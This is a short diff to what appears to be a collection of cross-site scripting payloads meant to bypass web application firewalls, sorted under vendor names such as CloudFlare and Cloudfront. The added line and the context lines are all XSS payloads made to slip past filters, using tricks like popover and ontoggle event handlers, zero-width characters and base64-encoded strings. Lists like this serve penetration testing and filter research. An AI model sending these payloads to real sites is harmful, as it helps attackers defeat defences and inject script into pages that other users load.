@@ -17,6 +17,7 @@ CloudFlare
 <button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
 "><Svg Only=1 OnLoad​=confirm(atob("Q2xvdWRmbGFyZSBYU1Mg"))>
 ["');alert('XSS');//"]
+"><details/open/id="&XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>
   
 Cloudfront
 
